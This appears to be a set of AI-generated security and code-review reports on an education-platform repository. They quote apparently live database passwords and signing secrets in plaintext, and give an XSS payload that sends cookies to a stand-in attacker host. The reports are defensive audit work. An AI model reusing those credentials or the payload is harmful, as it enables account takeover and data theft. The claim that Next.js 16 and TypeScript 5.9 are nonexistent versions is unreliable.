Based on a forensic static analysis of the provided files, the following issues have been identified:

### 1. Critical Production Credential Exposure
*   **Issue:** Plaintext exposure of production database credentials.
*   **Evidence:** `FILE 1` line 1: `DATABASE_URL="postgresql://neondb_owner:npg_8WDE6TeAZRJY@ep-hidden-cloud-adq8iepn-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require"`
*   **Why:** The connection string contains a hardcoded password (`npg_8WDE6TeAZRJY`) for a live Neon PostgreSQL instance.
*   **Failure Scenario:** Any individual with read access to the repository can gain full administrative control over the production database, leading to unauthorized data access, modification, or deletion.
*   **Fix Strategy:** Immediately rotate the database password and move the connection string to a secure environment variable manager (e.g., Vercel Dashboard) rather than a flat file.

### 2. Cryptographic Secret Leakage
*   **Issue:** Exposure of `NEXTAUTH_SECRET`.
*   **Evidence:** `FILE 1` line 2: `NEXTAUTH_SECRET="kHQsjR8Tz0c5DkVhznWkGQdmBj9xxZkgx-wUX4ynEF4"`
*   **Why:** This secret is used to sign and encrypt session cookies and JWTs.
*   **Failure Scenario:** An attacker can use this secret to forge valid session tokens, bypassing authentication and impersonating any user, including administrators.
*   **Fix Strategy:** Generate a new high-entropy secret, update the production environment variables, and ensure the `.env` file is never committed to version control.

### 3. Expired Authentication Token
*   **Issue:** The `VERCEL_OIDC_TOKEN` in the local environment is expired.
*   **Evidence:** `FILE 3` line 2 payload analysis: The `exp` claim is `1773627342` (March 16, 2026, 02:15:42 UTC). Today's date is March 18, 2026.
*   **Why:** Tokens are time-bound for security. This token has surpassed its validity window.
*   **Failure Scenario:** Automated deployment scripts or CLI operations (like `vercel deploy`) will fail with `401 Unauthorized` errors, halting the delivery pipeline.
*   **Fix Strategy:** Re-authenticate via the Vercel CLI to refresh the local OIDC token.

### 4. Local Environment Misconfiguration
*   **Issue:** `NODE_ENV` is set to `production` in a local `.env` file.
*   **Evidence:** `FILE 1` line 4: `NODE_ENV="production"`
*   **Why:** `.env` files are typically used for local development. Setting it to production locally can trigger production-only behaviors (e.g., strict SSL requirements, minified code) that break local testing.
*   **Failure Scenario:** Developers may experience silent failures or be unable to debug the application effectively as error stack traces and "hot reloading" are typically disabled in production mode.
*   **Fix Strategy:** Set `NODE_ENV` to `development` in the local `.env` file.

### 5. Authentication Redirect Mismatch
*   **Issue:** `NEXTAUTH_URL` points to production in a local context.
*   **Evidence:** `FILE 1` line 3: `NEXTAUTH_URL="https://eduplatform-tau.vercel.app"`
*   **Why:** NextAuth uses this URL to construct callback links. If set to production during local development, it will redirect local users to the live site.
*   **Failure Scenario:** Developers attempting to log in locally will be redirected to the live production site, making it impossible to test authenticated flows on `localhost`.
*   **Fix Strategy:** Update `NEXTAUTH_URL` to `http://localhost:3000` (matching the default in `FILE 2`).

### 6. Environment Schema Inconsistency
*   **Issue:** Missing required environment variables defined in the template.
*   **Evidence:** `FILE 2` (Template) requires `NEXT_PUBLIC_API_URL`, but this variable is absent from `FILE 1`.
*   **Why:** The application code likely expects this variable to determine the backend API endpoint.
*   **Failure Scenario:** The Admin application will fail to fetch data or crash at runtime because it cannot resolve the API endpoint.
*   **Fix Strategy:** Synchronize `FILE 1` with `FILE 2` by adding the missing `NEXT_PUBLIC_API_URL` key.


---

### Forensic Analysis Report

#### **Issue 1: Exposure of Production Credentials (CRITICAL)**
*   **Evidence:** `FILE 2 (.env.production)` contains a plaintext `DATABASE_URL` with an active password (`npg_vzHZwWyu5TM9`) and specific `NEXTAUTH_SECRET`/`JWT_SECRET` hash values.
*   **Why:** Production secrets must never be stored in plain text or committed to version control. This violates the principle of "Separation of Secrets from Code."
*   **Failure scenario:** An attacker with repository access can gain full administrative control over the production database, leading to data exfiltration, deletion, or injection. They can also forge authentication tokens to hijack user sessions.
*   **Fix strategy:** Rotate the exposed database password and authentication secrets immediately. Transition these variables to a secure environment manager (e.g., Vercel Environment Variables) and ensure all `.env` files are added to `.gitignore`.

#### **Issue 2: API Endpoint Version Inconsistency**
*   **Evidence:** `FILE 2` defines `API_URL` as `.../api` while `NEXT_PUBLIC_API_URL` is defined as `.../api/v1`.
*   **Why:** Public-facing and internal API references are pointing to different base paths.
*   **Failure scenario:** Client-side components (using `NEXT_PUBLIC_API_URL`) will reach v1 endpoints, while server-side components (using `API_URL`) will hit a different or non-existent route, causing 404 errors or inconsistent data during Server-Side Rendering (SSR).
*   **Fix strategy:** Synchronize all API base URL variables to use a consistent versioned path (e.g., `/api/v1`) across all environments.

#### **Issue 3: Configuration Key Discrepancy (Environmental Drift)**
*   **Evidence:** `FILE 1` uses `NEXT_PUBLIC_APP_URL`. `FILE 2` uses `NEXTAUTH_URL`. `FILE 3` uses `API_BASE_URL` and `MOBILE_API_URL`.
*   **Why:** The application uses different keys for the same functional configuration across local, production, and example files.
*   **Failure scenario:** The application will fail to initialize or connect to services when moved between environments because the code expects keys that do not exist in the current environment's `.env` file (e.g., production code looking for `API_BASE_URL` from the example will find only `API_URL`).
*   **Fix strategy:** Audit the source code to determine the required keys, then standardize a single set of variable names to be used across all environments.

#### **Issue 4: Cryptographic Key Reuse**
*   **Evidence:** `FILE 2` uses the exact same hash for both `NEXTAUTH_SECRET` and `JWT_SECRET`.
*   **Why:** Reusing the same secret for different cryptographic purposes (session signing vs. JWT signing) is a security weakness that simplifies potential attacks and complicates rotation.
*   **Failure scenario:** A compromise of the JWT implementation could potentially leak information that allows an attacker to compromise the broader session management system since they share the same key material.
*   **Fix strategy:** Generate and implement distinct, high-entropy random strings for each secret.

#### **Issue 5: Protocol Prefix Inconsistency**
*   **Evidence:** `FILE 1` (Example) uses `postgresql://` while `FILE 2` (Production) uses `postgres://`.
*   **Why:** Many database drivers and ORMs (like Prisma) can be sensitive to the protocol prefix, and inconsistency leads to "it works on my machine" bugs.
*   **Failure scenario:** A developer setting up a local environment based on the production string might encounter connection parsing errors if their local client specifically requires the `postgresql://` format.
*   **Fix strategy:** Adopt the standard `postgresql://` prefix as the default across all configuration templates.


---

Based on a forensic analysis of the provided configuration files and workspace structure, here are the identified issues:

### 1. Exposure of Sensitive Cryptographic Material
*   **Evidence:** `upload-keystore.jks` exists in the root directory but is absent from **FILE 1** (`.gitignore`).
*   **Why:** Java KeyStore (.jks) files contain private keys used for signing Android applications. Committing these to version control allows anyone with repository access to sign and distribute malicious updates as the original author.
*   **Failure Scenario:** An attacker clones the repository, steals the keystore, and hijacks the mobile app distribution on the Play Store by signing a compromised APK.
*   **Fix Strategy:** Add the `.jks` extension to the ignore list and migrate the physical file to a secure, off-repo secret management system.

### 2. Environment-Specific Database Leakage
*   **Evidence:** `packages/db/dev.db` is present in the workspace, but **FILE 1** (`.gitignore`) contains no patterns for `.db` or SQLite files.
*   **Why:** Local database files often contain developer-specific data, session tokens, or PII that should never be persisted in the repository's history.
*   **Failure Scenario:** A developer accidentally commits a local database containing real user data used for testing, leading to a significant data breach.
*   **Fix Strategy:** Include universal database patterns (e.g., `*.db`, `*.sqlite`) in the global ignore configuration.

### 3. Non-Reproducible Dependency Tree
*   **Evidence:** **FILE 1** (`.gitignore`) and **FILE 3** (`.vercelignore`) explicitly exclude `pubspec.lock`.
*   **Why:** For application projects (like `apps/mobile`), the lock file ensures all environments use identical dependency versions. Ignoring it causes "dependency drift."
*   **Failure Scenario:** A CI build fails or introduces a runtime bug because it resolved a newer, incompatible version of a package that was never tested on the developer's machine.
*   **Fix Strategy:** Remove `pubspec.lock` from both ignore files to ensure consistent builds across the team.

### 4. Hardcoded Infrastructure Identifiers
*   **Evidence:** **FILE 2** (`.neon`) contains a hardcoded `"orgId"`. While ignored in **FILE 3** (`.vercelignore`), it is NOT ignored in **FILE 1** (`.gitignore`).
*   **Why:** Hardcoding organizational IDs in tracked files limits environment flexibility and leaks internal infrastructure details. The inconsistency between Git and Vercel ignore lists indicates a disjointed configuration strategy.
*   **Failure Scenario:** Deploying the project under a different organization requires manual code changes, increasing the risk of configuration errors or accidental deployment to the wrong environment.
*   **Fix Strategy:** Move infrastructure identifiers to environment variables and add the `.neon` file to the `.gitignore`.

### 5. Deployment Integrity Risk (Vercel)
*   **Evidence:** **FILE 3** (`.vercelignore`) contains the note: `DO NOT exclude apps/api/dist - it's needed for Vercel deployment`.
*   **Why:** Vercel is optimized to build from source. Deploying pre-compiled `dist` artifacts bypasses build-time checks and risks deploying stale or malicious code that does not match the source code in `src`.
*   **Failure Scenario:** A compromised local environment generates a malicious `dist` folder which is then deployed to production, even though the source code reviewed by the team is clean.
*   **Fix Strategy:** Configure the Vercel deployment pipeline to build from source and ignore all `dist` and `build` directories.

### 6. Runtime Artifact and Audit Bloat
*   **Evidence:** Workspace contains `apps/api/uploads/`, `apps/api/temp/`, and `.audit-state.json`, none of which are accounted for in **FILE 1**.
*   **Why:** These directories/files contain transient, user-generated, or diagnostic data that is highly volatile and not part of the application core.
*   **Failure Scenario:** Frequent updates to audit states and accidental commits of large user uploads lead to repository bloat and cluttered Git history.
*   **Fix Strategy:** Update the ignore configuration to include temporary directories, user uploads, and internal audit/forensic state files.


---

Based on a forensic static analysis of the provided files, the following issues have been identified:

### 1. Hardcoded Sensitive Credentials (Critical)
*   **Issue:** Plaintext exposure of cryptographic secrets.
*   **Evidence:** `JWT_SECRET: 'efc6cc4a7c81733b6f0951e98235a55ff54f9df2f08b3ef369b66145233f1eb6'` in `add-env.js`.
*   **Why:** Storing production secrets in source code violates security best practices and exposes the application to compromise if the codebase is shared, leaked, or committed to version control.
*   **Failure Scenario:** An attacker gains access to the repository, retrieves the JWT secret, and generates forged administrative tokens to gain full access to the backend API and user data.
*   **Fix Strategy:** Remove hardcoded secrets and retrieve them from a secure environment variable or a dedicated secret management service during execution.

### 2. Broken Automation Logic - Command Pipe Hijacking
*   **Issue:** Input intended for the CLI tool is blocked by a shell pipe.
*   **Evidence:** `exec('echo | vercel env add')` followed by `proc.stdin.write(value + '\n')` in `add-env.js`.
*   **Why:** In the shell command `echo | vercel env add`, the `stdin` of the process is directed to `echo`. Since `echo` ignores its `stdin`, the `value` written by the script never reaches the `vercel` command.
*   **Failure Scenario:** The `vercel` command hangs indefinitely waiting for input, or fails immediately because it only receives the output of the `echo` command instead of the intended variable value.
*   **Fix Strategy:** Remove the shell pipe (`echo |`) and pass the required values directly as command-line arguments to the CLI tool.

### 3. Functional Logic Error - Omission of Variable Names
*   **Issue:** The script fails to provide the required "name" parameter for environment variables.
*   **Evidence:** The loop `Object.entries(vars).forEach(([name, value]) => { ... })` ignores the `name` variable and only attempts to pipe the `value`.
*   **Why:** The Vercel CLI requires both a name and a value to create an environment variable. The script never communicates the name (e.g., `JWT_SECRET`) to the CLI.
*   **Failure Scenario:** The Vercel CLI prompts for a variable name and receives incorrect input or EOF, resulting in failed operations or variables being created with unintended names.
*   **Fix Strategy:** Refactor the command string to include the variable name as an argument (e.g., `vercel env add ${name}`).

### 4. Asynchronous Race Condition in Logging
*   **Issue:** Premature reporting of task completion.
*   **Evidence:** `console.log('Submitted ' + count + ' environment variables')` is executed immediately after the `forEach` loop, while the `exec` processes are still running in the background.
*   **Why:** `child_process.exec` is asynchronous, but the `forEach` loop and the subsequent `console.log` are synchronous. The script reports "success" before any of the operations have actually finished.
*   **Failure Scenario:** The script exits, leading the user to believe the variables were added, while the background processes may still be running or could fail silently seconds later.
*   **Fix Strategy:** Use `async/await` with a `for...of` loop or `Promise.all` to ensure all child processes complete before reporting the final status.

### 5. Cross-Platform Compatibility Failure (Windows `echo`)
*   **Issue:** Shell-dependent behavior causing unexpected input.
*   **Evidence:** `exec('echo | ...')` running on a `win32` system (as indicated in the environment context).
*   **Why:** On Windows, the `echo` command without arguments outputs the string `"ECHO is on."` followed by a newline. This is different from Unix systems where it outputs a blank line.
*   **Failure Scenario:** The Vercel CLI receives the literal string `"ECHO is on."` as the first piece of input, causing it to error out or use that string as a variable name.
*   **Fix Strategy:** Utilize the CLI's native non-interactive flags (e.g., `--value`) to avoid relying on shell-specific piping behavior.

### 6. Non-Portable Absolute Workspace Path
*   **Issue:** Environment-specific configuration prevents portability.
*   **Evidence:** `"cmake.sourceDirectory": "C:/Users/user/Desktop/edu_platform/apps/mobile/windows"` in `.vscode/settings.json`.
*   **Why:** Hardcoding absolute paths to a specific user's desktop ensures the project will fail to build or configure correctly on any other machine or CI/CD environment.
*   **Failure Scenario:** A second developer clones the project and finds that the mobile application development environment is broken because their local path does not match the hardcoded C: drive path.
*   **Fix Strategy:** Use workspace-relative paths or VS Code variables like `${workspaceFolder}` to define source directories.

### 7. Lack of Error Handling and Validation
*   **Issue:** Silent failures during critical infrastructure setup.
*   **Evidence:** `add-env.js` does not check `stderr`, the process exit code, or the `error` event of the spawned processes.
*   **Why:** Without monitoring the output of the sub-processes, the script cannot detect if the Vercel CLI is not installed, if the user is logged out, or if the network is down.
*   **Failure Scenario:** Every call to `vercel` fails, but the script still prints "Submitted 3 environment variables," leaving the deployment in an unconfigured state.
*   **Fix Strategy:** Implement event listeners for `error` and `exit` events on the child process and validate the `stderr` output.


---

I have conducted a forensic static analysis of the provided configuration files for the Admin application.

### 1. High-Risk Security Vulnerability: Sensitive Data Exposure
*   **Issue:** Hardcoded secrets and configuration files are not excluded from version control.
*   **Evidence:** `FILE 2` (`.env.local`) contains a plain-text `NEXTAUTH_SECRET`. `FILE 3` (`.gitignore`) lacks entries for `.env` or `.env.local`.
*   **Why:** The `.gitignore` file only excludes the `.vercel` directory, leaving environment files containing sensitive credentials eligible for staging and commitment to the repository.
*   **Failure Scenario:** An attacker discovers the `NEXTAUTH_SECRET` in the repository history, enabling them to forge valid session tokens and bypass authentication to gain administrative access.
*   **Fix Strategy:** Update the ignore configuration to explicitly exclude all environment files (`.env*`) and remove any existing environment files from the Git index.

### 2. Critical Configuration Omission: Incomplete `.gitignore`
*   **Issue:** Missing exclusions for build artifacts and dependencies.
*   **Evidence:** `FILE 3` (`.gitignore`) only contains `.vercel`.
*   **Why:** Standard Next.js and Node.js ignore patterns (e.g., `node_modules/`, `.next/`, `out/`, `build/`) are missing.
*   **Failure Scenario:** Developers will inadvertently commit gigabytes of dependency code and build caches. This leads to massive repository bloat, slow CI/CD pipelines, and frequent merge conflicts in non-source files.
*   **Fix Strategy:** Implement a comprehensive ignore policy covering platform-specific build outputs, package manager directories, and local editor configurations.

### 3. API Routing Discrepancy
*   **Issue:** Inconsistent API URL structures between example and local configurations.
*   **Evidence:** `FILE 1` uses `.../api/v1`, whereas `FILE 2` uses `.../api` (missing the version suffix).
*   **Why:** The local environment configuration deviates from the documented standard in the example file.
*   **Failure Scenario:** API requests from the admin dashboard will return `404 Not Found` errors because the local/deployed environment is targeting the wrong endpoint path compared to the architectural design.
*   **Fix Strategy:** Standardize the API endpoint path across all environment templates and ensure local overrides maintain the required versioning prefix.

### 4. Operational Impediment: Placeholder Configuration in "Local" File
*   **Issue:** Non-functional database connection string in an active local environment file.
*   **Evidence:** `FILE 2` contains `DATABASE_URL=postgresql://your-db-url`.
*   **Why:** The local configuration file was created using placeholders rather than functional local development values.
*   **Failure Scenario:** The application server will fail to initialize or will crash during the first database-dependent operation (e.g., login), preventing any local development or testing.
*   **Fix Strategy:** Replace placeholder comments in local configuration files with valid local development credentials or a standardized local database connection string.


---

I will read the full content of `DocumentViewer.tsx` to identify all issues, particularly how `documentContent` is rendered.
### Forensic Analysis Report

#### 1. Issue: Critical Cross-Site Scripting (XSS) via Unsanitized Data Injection
*   **Evidence:** 
    *   Line 345: `<div dangerouslySetInnerHTML={{ __html: documentContent }} />`
    *   Lines 339-341: `dangerouslySetInnerHTML={{ __html: highlightText(result.text, searchTerm) }}`
    *   Lines 77 & 83: `setDocumentContent('<iframe src="${url}" ...></iframe>')`
    *   Lines 184-187: The `highlightText` function uses `replace` to inject `<mark>` tags without escaping the source `text`.
*   **Why:** The component explicitly bypasses React's XSS protections by using `dangerouslySetInnerHTML`. It constructs HTML strings from external sources (`url` and fetched `content`) without any sanitization or escaping.
*   **Failure Scenario:** An attacker provides a URL containing a payload like `"><script>fetch('https://evil.com/'+document.cookie)</script>`. When an admin views this "document," the script executes in their session, potentially stealing authentication tokens or performing actions on their behalf.
*   **Fix Strategy:** Remove `dangerouslySetInnerHTML`. Use a sanitized HTML library if rendering HTML is necessary, or render content as plain text. Use `<iframe>` as a proper JSX element with a `src` attribute rather than an injected string.

#### 2. Issue: Broken Asynchronous Logic in Document Search
*   **Evidence:** Lines 163-181 (`searchInDocument` function).
*   **Why:** 
    1.  `page.getTextContent()` returns a Promise, but the code attempts to access `.items` on it immediately as if it were synchronous (Line 170).
    2.  The `setSearchResults(results)` call occurs outside the `then` blocks, meaning it executes before any async results are actually collected into the `results` array.
*   **Failure Scenario:** A user performs a search; the UI immediately clears or displays nothing. Behind the scenes, the browser console throws errors because it cannot read property `items` of `undefined` (the Promise object).
*   **Fix Strategy:** Convert the search loop to use `await` within a `for...of` loop or use `Promise.all` to aggregate results from all pages before updating the state.

#### 3. Issue: Improper Handling of Binary File Formats (Word/Excel)
*   **Evidence:** 
    *   Lines 134-143: `fetch(url)` followed by `response.text()` and a naive regex `replace(/<[^>]*>/g, '')`.
    *   Line 43: `window.open(url, '_blank')` for Excel/PowerPoint.
*   **Why:** `.docx`, `.xlsx`, and `.pptx` files are compressed binary archives (OpenXML), not plain text or HTML. Reading them as text returns corrupt binary data. The regex is useless against binary blobs.
*   **Failure Scenario:** When a user opens a Word document, the viewer displays thousands of lines of unreadable binary characters (e.g., `PK......`), causing a poor user experience and potential browser hang due to the massive string size.
*   **Fix Strategy:** Use a dedicated library (like `mammoth.js` for Word or `SheetJS` for Excel) to parse binary content, or delegate rendering to a secure cloud-based viewer (e.g., Google Docs/Office Online viewer).

#### 4. Issue: PDF Rendering Race Conditions and Resource Leaks
*   **Evidence:** Lines 89-110 (`renderPage` function).
*   **Why:** `page.render()` is an asynchronous operation. If a user triggers multiple renders (e.g., zooming quickly or changing pages rapidly), multiple render tasks will simultaneously attempt to draw on the same `<canvas>` element. The code never calls `renderTask.cancel()` on previous operations.
*   **Failure Scenario:** The PDF viewer flickers violently during zoom, or displays overlapping text/images from two different pages if the older render finishes after the newer one.
*   **Fix Strategy:** Store the current `renderTask` in a `useRef`. Before starting a new render, check if a previous task exists and call its `.cancel()` method.

#### 5. Issue: Insecure Print Implementation
*   **Evidence:** Lines 200-218 (`printDocument` function).
*   **Why:** It uses `printWindow.document.write()` to inject a string containing the document title and a data URL. `document.write` is deprecated and insecure.
*   **Failure Scenario:** If a document title is set to `My Doc<img src=x onerror=alert(1)>`, the print preview window will execute the malicious script as soon as it opens.
*   **Fix Strategy:** Avoid `document.write`. Create a hidden iframe, populate its content using standard DOM methods (`createElement`, `textContent`), and call `print()` on the iframe's `contentWindow`.

#### 6. Issue: Lack of Network Error Validation
*   **Evidence:** Line 132: `const response = await fetch(url);` followed immediately by `response.text()`.
*   **Why:** `fetch` does not throw an error on HTTP failure status codes (like 404 or 500).
*   **Failure Scenario:** If the document URL is broken (404), the code will "successfully" fetch the server's HTML error page, treat it as the document content, and potentially render the raw HTML of the 404 page in the viewer.
*   **Fix Strategy:** Check `if (!response.ok)` before attempting to process the body, and throw an error to be caught by the `catch` block.


---

### Forensic Analysis Report

#### **FILE 1: MediaPlayer.tsx**

**Issue 1: Critical Source Truncation & Syntax Error**
*   **Evidence:** The file ends abruptly at line 125: `justifyContent: 'space-betw`.
*   **Why:** The provided code is incomplete, leaving JSX tags unclosed and the `return` statement unfinished.
*   **Failure Scenario:** The application will fail to compile (Syntax Error). Even if it compiled, the UI would be broken as the actual `<video>` or `<audio>` elements are never rendered in the provided snippet.
*   **Fix Strategy:** Complete the component implementation by closing all open `<div>` tags and adding the logic to render the media elements and their controls.

**Issue 2: Fullscreen State Synchronization Desync**
*   **Evidence:** `setIsFullscreen(!isFullscreen);` is toggled manually within the `toggleFullscreen` function.
*   **Why:** Browser-native fullscreen transitions (e.g., pressing the `ESC` key) bypass the React state update logic.
*   **Failure Scenario:** If a user enters fullscreen via the button but exits via the `ESC` key, the internal `isFullscreen` state remains `true`. The next click on the toggle button will incorrectly attempt to call `exitFullscreen()` while already in normal mode.
*   **Fix Strategy:** Implement a `useEffect` hook to listen for the native `fullscreenchange` event on the document to update the state based on the actual browser status.

**Issue 3: Unhandled Promise Rejection on Playback**
*   **Evidence:** `mediaRef.current.play();` (Line 49) is called directly.
*   **Why:** `HTMLMediaElement.play()` returns a Promise. In modern browsers, this promise often rejects if autoplay policies block the action or if the media hasn't loaded.
*   **Failure Scenario:** An unhandled promise rejection error will appear in the console, and the UI might become unresponsive if the application logic expects the media to start playing immediately.
*   **Fix Strategy:** Wrap the `.play()` call in a try/catch block or append a `.catch()` handler to gracefully manage playback interruptions.

**Issue 4: Unsafe Type Assertion for Fullscreen API**
*   **Evidence:** Use of `(containerRef.current as any).webkitRequestFullscreen` and `(document as any).webkitExitFullscreen`.
*   **Why:** Using `any` bypasses TypeScript's type safety for vendor-prefixed methods that are not part of the standard `HTMLElement` or `Document` interfaces.
*   **Failure Scenario:** If a browser removes support for a prefixed method, TypeScript will not provide a build-time warning, leading to a runtime "is not a function" crash.
*   **Fix Strategy:** Create a type declaration file to properly extend the `HTMLElement` and `Document` interfaces with the necessary vendor-prefixed properties.

---

#### **FILE 2: StatsCard.tsx**

**Issue 5: Accessibility (A11y) Violation for Decorative Icons**
*   **Evidence:** `{icon && <span style={{ ... }}>{icon}</span>}` (Line 20).
*   **Why:** Icons/emojis passed as strings are rendered inside a `span` without `aria-hidden="true"`.
*   **Failure Scenario:** Screen readers will attempt to read the emoji's internal name or the icon's character code, which can be confusing or redundant for visually impaired users if the icon is purely decorative.
*   **Fix Strategy:** Add `aria-hidden="true"` to the span containing the icon, or provide a descriptive `aria-label` if the icon conveys specific meaning.

---

#### **FILE 3: useAuth.ts**

**Issue 6: Dead Code (Unused React Hooks)**
*   **Evidence:** `import { useEffect, useState } from 'react';` (Line 2).
*   **Why:** These hooks are imported but never utilized within the `useAuth` function body.
*   **Failure Scenario:** Increased bundle size and potential confusion for maintainers who might assume side-effect logic exists where it does not.
*   **Fix Strategy:** Remove the unused imports to clean up the hook.

**Issue 7: Brittle Type Assertion on Session Object**
*   **Evidence:** `token: session?.accessToken as string | undefined` (Line 14).
*   **Why:** The standard `Session` type in `next-auth` does not include an `accessToken` property. This code relies on a manual type assertion rather than confirmed type augmentation.
*   **Failure Scenario:** If the `next-auth` configuration (callbacks) does not explicitly pass the `accessToken` to the session, this property will be `undefined` at runtime despite the type system suggesting it should be a string.
*   **Fix Strategy:** Perform proper type augmentation for the `next-auth` module and verify that the `accessToken` is correctly populated in the `session` callback within the authentication configuration.


---

### **Forensic Static Analysis Report**

#### **Issue 1: Authentication Token Desync**
*   **Evidence:** `api.ts` uses a module-level variable `authToken` for its request interceptor. `useDashboard.ts` receives `token` as an argument and triggers `fetchDashboardData` when it changes, but never invokes `setAuthToken(token)`.
*   **Why:** The `api` instance's request interceptor (Line 20, `api.ts`) relies on the state of `authToken`. If the `token` passed to the hook is updated, the global axios instance remains unaware of this change.
*   **Failure Scenario:** A user logs out and logs in as a different user. The dashboard attempts to fetch data using the *previous* user's token stored in the module closure, resulting in `403 Forbidden` errors or, if tokens are long-lived, displaying data from the wrong account.
*   **Fix Strategy:** Synchronize the axios instance state by calling the exported `setAuthToken` function inside the `useEffect` block of the dashboard hook before initiating data fetches.

#### **Issue 2: Sequential Network Waterfall**
*   **Evidence:** `fetchDashboardData` (Lines 34–58, `useDashboard.ts`) uses `await` for five consecutive API calls: `/dashboard`, then `/schools/`, then `/users`, `/lessons`, and finally `/quizzes`.
*   **Why:** Each request waits for the previous one to resolve. While the school ID depends on the dashboard response, the users, lessons, and quizzes fetches are independent.
*   **Failure Scenario:** On a high-latency connection, if each request takes 300ms, the user sees a loading spinner for over 1.5 seconds. If any middle request hangs, subsequent independent data (like recent users) is never fetched.
*   **Fix Strategy:** Execute independent requests in parallel using concurrency primitives to reduce total loading time to `max(request_durations)` rather than `sum(request_durations)`.

#### **Issue 3: Memory-Intensive Client-Side Sorting (Scaling Failure)**
*   **Evidence:** `usersRes.data.sort(...)`, `lessonsRes.data.sort(...)`, and `quizzesRes.data.sort(...)` followed by `.slice(0, 5)` (Lines 46–58, `useDashboard.ts`).
*   **Why:** The hook fetches the *entire* database table for users, lessons, and quizzes into browser memory just to display the five most recent items.
*   **Failure Scenario:** Once the platform reaches a moderate scale (e.g., 5,000 users or lessons), the browser will download several megabytes of JSON. The JavaScript main thread will then lock up while sorting these large arrays, leading to "Page Unresponsive" errors and significant mobile battery drain.
*   **Fix Strategy:** Offload sorting and filtering to the database by implementing server-side pagination and query parameters (e.g., `?limit=5&sort=desc`).

#### **Issue 4: Race Condition in Async Effect**
*   **Evidence:** `useEffect` (Line 72, `useDashboard.ts`) triggers an asynchronous function on `token` change without an `AbortController` or a "mounted" cleanup flag.
*   **Why:** Multiple instances of `fetchDashboardData` can be "in flight" simultaneously if the `token` state flickers or updates rapidly.
*   **Failure Scenario:** A slow request from an old token might resolve *after* a fast request from a new token. The dashboard would then display stale data from the previous session/token despite the UI state indicating a new session.
*   **Fix Strategy:** Implement a cleanup mechanism within the effect to ignore the results of any asynchronous operation if the effect is re-triggered or the component unmounts before the promise resolves.

#### **Issue 5: Schema Mismatch and Property Access Risks**
*   **Evidence:** 
    1. `useDashboard.ts` (Line 41) accesses `dashboardRes.data.user.schoolId`.
    2. `api.ts` (Lines 102–115) defines `Analytics` (presumably the `/dashboard` response) but lacks a `user` object or `schoolId`.
    3. `DashboardData` (Line 10, `useDashboard.ts`) expects `totalClasses`, which is missing from the `Analytics` interface in `api.ts`.
*   **Why:** The hook makes assumptions about the API response structure that contradict the project's own type definitions.
*   **Failure Scenario:** The application crashes with `TypeError: Cannot read property 'schoolId' of undefined` if the `/dashboard` endpoint returns the `Analytics` structure as defined in `api.ts` rather than the inferred structure used in the hook.
*   **Fix Strategy:** Consolidate data interfaces into a single source of truth in `api.ts` and ensure the hook uses these shared types instead of re-declaring conflicting local interfaces.

#### **Issue 6: Hardcoded Production Fallback (Security/Configuration)**
*   **Evidence:** `const API_BASE_URL = ... || 'https://edu-platform-three-sable.vercel.app/api/v1';` (Line 3, `api.ts`).
*   **Why:** Hardcoding a production Vercel URL as a fallback bypasses environment-specific logic.
*   **Failure Scenario:** A developer forgets to set local environment variables, and the application silently connects to and modifies the production/staging database instead of a local development server, leading to accidental data corruption or leakage.
*   **Fix Strategy:** Remove the hardcoded URL string and implement a strict check that throws an error if `NEXT_PUBLIC_API_URL` is missing, or default to a safe `localhost` endpoint for development.


---

### Forensic Analysis Report: `apps/admin`

#### **Issue 1: Sensitive Credential Leak (Security)**
- **Evidence:** 
  ```javascript
  // next.config.js
  env: {
    NEXTAUTH_SECRET: process.env.NEXTAUTH_SECRET,
  }
  ```
- **Why:** The `env` object in `next.config.js` bundles these values into the **client-side** JavaScript. `NEXTAUTH_SECRET` is a server-side secret used to sign and verify JWTs.
- **Failure Scenario:** An attacker inspects the bundled JavaScript in a web browser, extracts the `NEXTAUTH_SECRET`, and uses it to forge administrative session tokens, gaining full unauthorized access to the platform.
- **Fix Strategy:** Remove sensitive environment variables from `next.config.js`. Only variables prefixed with `NEXT_PUBLIC_` should be exposed to the client; server-side code should access secrets directly via `process.env`.

#### **Issue 2: Insecure API Caching / Cache Poisoning (Security)**
- **Evidence:** 
  ```javascript
  // next.config.js
  {
    source: '/api/v1/:path*',
    headers: [{ key: 'Cache-Control', value: 'public, s-maxage=10...' }]
  }
  ```
- **Why:** Applying a `public` cache header to all API routes allows intermediate proxies (CDNs) to store and serve responses. API routes typically contain sensitive, user-specific data.
- **Failure Scenario:** User A fetches their private profile. A CDN caches the response. User B requests their own profile shortly after, and the CDN serves them User A's cached data, resulting in a major data breach.
- **Fix Strategy:** Remove the global `Cache-Control` header from `next.config.js`. Caching should be handled on a per-route basis within the API logic, using `private` or `no-store` for authenticated content.

#### **Issue 3: Invalid/Non-Existent Dependency Versions (Infrastructure)**
- **Evidence:** 
  ```json
  // package.json
  "next": "^16.1.6",
  "typescript": "5.9.3"
  ```
- **Why:** Next.js version 16 and TypeScript version 5.9 do not exist in the current stable ecosystem. These represent "ghost" versions that are likely typos or references to non-standard registries.
- **Failure Scenario:** The CI/CD pipeline fails during `npm install` because the registry cannot find these versions, or the application fails to build due to radical API changes in an experimental or malicious package.
- **Fix Strategy:** Revert package versions to stable, verified releases (e.g., Next.js 14/15 and TypeScript 5.4/5.5) that match the project's peer dependencies.

#### **Issue 4: Circular Production API Rewrite (Logic)**
- **Evidence:** 
  ```javascript
  // next.config.js
  if (process.env.NODE_ENV === 'production') {
    return [{ source: '/api/v1/:path*', destination: '/api/v1/:path*' }];
  }
  ```
- **Why:** This rewrite maps a source to an identical destination. In production, this is a "no-op" or a circular reference that fails to proxy requests to the intended backend service.
- **Failure Scenario:** In production, the frontend attempts to call `/api/v1/users`, but because the rewrite points to itself, the request never reaches the backend API server, resulting in 404 errors across the entire application.
- **Fix Strategy:** Update the production destination to point to the actual external API URL (e.g., `https://api.production-domain.com/:path*`) or remove the rewrite if the ingress handles routing.

#### **Issue 5: Deployment of Unvalidated Code (Quality)**
- **Evidence:** 
  ```javascript
  // next.config.js
  eslint: { ignoreDuringBuilds: true }
  ```
- **Why:** This configuration explicitly disables the linting safety check during the build process.
- **Failure Scenario:** Developers accidentally commit code with syntax errors or security vulnerabilities. The build passes anyway, and broken or insecure code is deployed to the production environment.
- **Fix Strategy:** Enable linting during builds by removing this property or setting it to `false`, and resolve any linting errors in the source code.


---

Based on a forensic analysis of the provided files, here are the identified issues:

### 1. Performance & Privacy: Massive Data Over-fetching
*   **Issue:** Client-side filtering of sensitive user data.
*   **Evidence:** `FILE 3`, Lines 82-88:
    ```typescript
